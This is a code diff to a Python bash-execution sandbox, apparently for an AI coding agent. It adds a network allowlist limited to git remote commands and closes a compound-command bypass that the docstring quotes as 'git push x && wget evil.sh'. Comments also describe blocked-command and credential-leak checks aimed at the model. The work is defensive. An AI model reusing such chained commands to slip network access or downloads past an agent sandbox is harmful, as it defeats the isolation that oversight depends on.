@@ -106,8 +106,47 @@ _BLOCKED_BASE_COMMANDS = frozenset({
     "crontab",
 })
 
+# 网络白名单（2026-09-11 白名单化）：仅这些「可信 git 远程操作」在沙箱中开放网络
+# （bwrap wrap(allow_network=True)，不再注入 --unshare-net）。其余命令仍网络隔离。
+# 设计：git 本身不在黑名单（_check_blocked 放行），git 内部调 ssh 是子进程、
+# 命令行无 ssh token 不触发 _BLOCKED_BASE_COMMANDS；本白名单只决定「是否去掉网络隔离」。
+_NETWORK_ALLOWED_COMMANDS = (
+    "git push",
+    "git fetch",
+    "git pull",
+    "git clone",
+    "git ls-remote",
+    "git remote",
+)
+
+def _is_network_allowed(command: str) -> bool:
+    """判断命令是否命中网络白名单（全链判定，仅 git 远程/认证类操作）。
+
+    修复 2026-09-11（复合命令绕过）：此前仅对整条命令前缀匹配，导致
+    ``git push x && wget evil.sh`` 整条放行网络（fail-open）。现复用
+    ``_split_chain`` 拆分 ``&&/||/;/|/$()/``` `` 后逐个判定，
+    要求**所有子命令都命中**白名单才返回 True（全链白名单，缺一即隔离）。
+
+    命中返回 True -> _sandbox_command 传 allow_network=True。
+    """
+    parts = BashExecutor._split_chain(command)
+    if not parts:
+        return False
+    for sub in parts:
+        norm = sub.strip().lower().replace("'", "").replace('"', "")
+        hit = any(
+            norm == allowed or norm.startswith(allowed + " ")
+            for allowed in _NETWORK_ALLOWED_COMMANDS
+        )
+        if not hit:
+            return False
+    return True
+
+
 _DEFAULT_MEMORY_LIMIT = 512 * 1024 * 1024  # 512 MB
 _DEFAULT_CPU_LIMIT = 30  # seconds
+# 修复 2026-09-11：白名单 git 远程操作内存限额放宽（git 需 ~500MB 堆，512MB 撞限）
+_NETWORK_ALLOWED_MEMORY_LIMIT = 1024 * 1024 * 1024  # 1 GB
 
 # P0-1: 凭据模式检测（对标 AtomCode atomgit_bash_gate.rs TOKEN_MARKERS）
 # 防止模型通过 bash 传递凭据（access_token、bearer token、环境变量引用）
@@ -182,7 +221,7 @@ class BashExecutor:
                     text=True,
                     timeout=effective_timeout,
                     cwd=self.working_dir,
-                    preexec_fn=self._set_resource_limits,
+                    preexec_fn=lambda: self._set_resource_limits(command),
                 )
             else:
                 # 无 bwrap：显式使用 bash 而非 sh（dash），避免 bash 语法兼容问题
@@ -193,7 +232,7 @@ class BashExecutor:
                     text=True,
                     timeout=effective_timeout,
                     cwd=self.working_dir,
-                    preexec_fn=self._set_resource_limits,
+                    preexec_fn=lambda: self._set_resource_limits(command),
                 )
             duration = time.monotonic() - start
             return BashResult(
@@ -282,7 +321,12 @@ class BashExecutor:
                 command[:80],
             )
             return command
-        return provider.wrap(command, working_dir=self.working_dir)
+        allow_network = _is_network_allowed(command)
+        return provider.wrap(
+            command,
+            working_dir=self.working_dir,
+            allow_network=allow_network,
+        )
 
     def set_sandbox_provider(self, provider: Any) -> None:
         """注入沙箱后端插片（SandboxProvider Protocol：name/available/wrap）。
@@ -461,18 +505,35 @@ class BashExecutor:
 
         return []
 
-    def _set_resource_limits(self) -> None:
+    def _set_resource_limits(self, command: str | None = None) -> None:
+        # 修复 2026-09-11：git 远程操作（push/fetch/pull/clone/ls-remote/remote）
+        # 需 ~500MB 堆分配，512MB 默认限制撞限（实测 malloc failed）。白名单命令
+        # 放宽至 1GB（NETWORK_ALLOWED_MEMORY_LIMIT），其余保持 512MB fail-safe。
+        # 健壮化 2026-09-11：父进程 hard limit 锁死（如 512MB）时 setrlimit 抛 EINVAL，
+        # 此前被静默吞掉导致白名单命令实际仍撞限。现在记录日志便于运维诊断。
+        memory_limit = self.memory_limit
+        if command and _is_network_allowed(command):
+            memory_limit = max(memory_limit, _NETWORK_ALLOWED_MEMORY_LIMIT)
         try:
             resource.setrlimit(
                 resource.RLIMIT_AS,
-                (self.memory_limit, self.memory_limit),
+                (memory_limit, memory_limit),
             )
-        except (ValueError, OSError):
-            pass
+        except (ValueError, OSError) as exc:
+            soft, hard = resource.getrlimit(resource.RLIMIT_AS)
+            logging.warning(
+                "RLIMIT_AS setrlimit 失败: target=%sMB err=%s (白名单=%s); "
+                "当前 soft=%s hard=%s",
+                memory_limit // 1024 // 1024,
+                exc,
+                bool(command and _is_network_allowed(command)),
+                soft // 1024 // 1024 if soft != resource.RLIM_INFINITY else "inf",
+                hard // 1024 // 1024 if hard != resource.RLIM_INFINITY else "inf",
+            )
         try:
             resource.setrlimit(
                 resource.RLIMIT_CPU,
                 (self.cpu_limit, self.cpu_limit),
             )
-        except (ValueError, OSError):
-            pass
+        except (ValueError, OSError) as exc:
+            logging.warning("RLIMIT_CPU setrlimit 失败: err=%s", exc)
